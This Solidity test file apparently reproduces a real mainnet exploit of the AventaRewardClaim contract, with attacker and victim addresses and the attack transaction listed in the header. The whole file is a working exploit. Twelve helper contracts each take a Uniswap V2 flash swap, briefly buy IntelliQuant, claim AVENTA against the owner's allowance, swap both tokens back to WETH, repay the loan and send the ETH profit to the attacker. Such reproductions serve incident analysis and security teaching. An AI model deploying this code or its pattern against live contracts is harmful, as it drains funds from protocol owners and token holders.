// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 16,019,528 AVENTA
// Attacker : 0x7c982e93d6b1ede9626a84ebeafbc42e5991dee8
// Attack Contract : 0x0cdaa461d9d60ef84ded453fa1fbd3e2916f9016
// Vulnerable Contract : 0x33b860fc7787e9e4813181b227eaffa0cada4c73
// Attack Tx : https://etherscan.io/tx/0x59446b1f58457c83d18864bbfaa8930c9438da33017ad41f08397cf79a8c63e5
//
// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x33b860fc7787e9e4813181b227eaffa0cada4c73#code
//
// @Analysis
// Twitter Guy : https://t.me/defimon_alerts/927
//
// AventaRewardClaim calculates a user's claim from the user's current
// IntelliQuant balance, then pays AVENTA from the Owner allowance. The contract
// only requires user == msg.sender, so the attacker used fresh helper addresses:
// each helper briefly bought IntelliQuant, claimed AVENTA, sold both tokens for
// WETH, repaid a tiny Uniswap V2 flash swap, and forwarded ETH profit.

address constant ATTACKER = 0x7c982E93d6B1eDE9626A84EbeafBC42e5991Dee8;
address constant HISTORICAL_ATTACK_CONTRACT = 0x0cdAa461D9D60Ef84Ded453Fa1fbD3E2916F9016;
address constant VICTIM_OWNER = 0x3B068F4Fa718eD1F21D291f4C20aB1C80909A5D3;
address constant AVENTA_REWARD_CLAIM = 0x33B860FC7787e9e4813181b227EAfFa0Cada4C73;
address constant FLASH_PAIR = 0xa2107FA5B38d9bbd2C461D6EDf11B11A50F6b974;
address constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
address constant WETH_TOKEN = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
address constant INTELLIQUANT_TOKEN = 0x31Bd628c038f08537e0229f0D8c0a7b18B0CDa7B;
address constant AVENTA_TOKEN = 0xd9641fC2826Ecc9beBf4F3852fe4ED92a5239F02;
uint256 constant FLASH_WETH_AMOUNT = 0.01 ether;
uint256 constant HELPER_COUNT = 12;

interface IAventaRewardClaim {
    function claim(
        address user
    ) external;
}

contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        vm.createSelectFork("mainnet", 22_358_982);

        fundingToken = address(0);
        attacker = ATTACKER;

        vm.label(ATTACKER, "Attacker");
        vm.label(HISTORICAL_ATTACK_CONTRACT, "Historical attack contract");
        vm.label(VICTIM_OWNER, "Aventa owner/victim");
        vm.label(AVENTA_REWARD_CLAIM, "AventaRewardClaim");
        vm.label(AVENTA_TOKEN, "AVENTA");
        vm.label(INTELLIQUANT_TOKEN, "IntelliQuant");
        vm.label(FLASH_PAIR, "Uniswap flash pair");
        vm.label(UNISWAP_V2_ROUTER, "Uniswap V2 router");
        vm.label(WETH_TOKEN, "WETH");
    }

    function testExploit() public balanceLog {
        uint256 attackerEthBefore = ATTACKER.balance;

        AventaRewardClaimBatch exploit = new AventaRewardClaimBatch();
        exploit.attack();

        uint256 attackerProfit = ATTACKER.balance - attackerEthBefore;
        assertGt(attackerProfit, 3 ether);
    }
}

contract AventaRewardClaimBatch {
    function attack() external {
        for (uint256 i; i < HELPER_COUNT; ++i) {
            new AventaRewardClaimHelper().attack();
        }
    }
}

contract AventaRewardClaimHelper {
    IWETH private constant weth = IWETH(payable(WETH_TOKEN));
    IERC20 private constant intelliQuant = IERC20(INTELLIQUANT_TOKEN);
    IERC20 private constant aventa = IERC20(AVENTA_TOKEN);
    IUniswapV2Router private constant router = IUniswapV2Router(payable(UNISWAP_V2_ROUTER));
    IAventaRewardClaim private constant rewardClaim = IAventaRewardClaim(AVENTA_REWARD_CLAIM);

    function attack() external {
        IUniswapV2Pair(FLASH_PAIR).swap(0, FLASH_WETH_AMOUNT, address(this), hex"1234");
    }

    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata
    ) external {
        require(msg.sender == FLASH_PAIR, "flash pair");
        require(sender == address(this), "sender");
        require(amount0 == 0 && amount1 == FLASH_WETH_AMOUNT, "loan amount");

        weth.approve(UNISWAP_V2_ROUTER, type(uint256).max);
        intelliQuant.approve(UNISWAP_V2_ROUTER, type(uint256).max);
        aventa.approve(UNISWAP_V2_ROUTER, type(uint256).max);

        _swap(WETH_TOKEN, INTELLIQUANT_TOKEN, FLASH_WETH_AMOUNT);

        rewardClaim.claim(address(this));

        _swap(INTELLIQUANT_TOKEN, WETH_TOKEN, intelliQuant.balanceOf(address(this)));
        _swap(AVENTA_TOKEN, WETH_TOKEN, aventa.balanceOf(address(this)));

        uint256 repayment = (FLASH_WETH_AMOUNT * 1004) / 1000 + 1;
        weth.transfer(FLASH_PAIR, repayment);

        uint256 profitWeth = weth.balanceOf(address(this));
        weth.withdraw(profitWeth);
        payable(ATTACKER).transfer(address(this).balance);
    }

    function _swap(
        address tokenIn,
        address tokenOut,
        uint256 amountIn
    ) private {
        if (amountIn == 0) return;

        address[] memory path = new address[](2);
        path[0] = tokenIn;
        path[1] = tokenOut;

        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amountIn, 0, path, address(this), block.timestamp);
    }

    receive() external payable {}
}
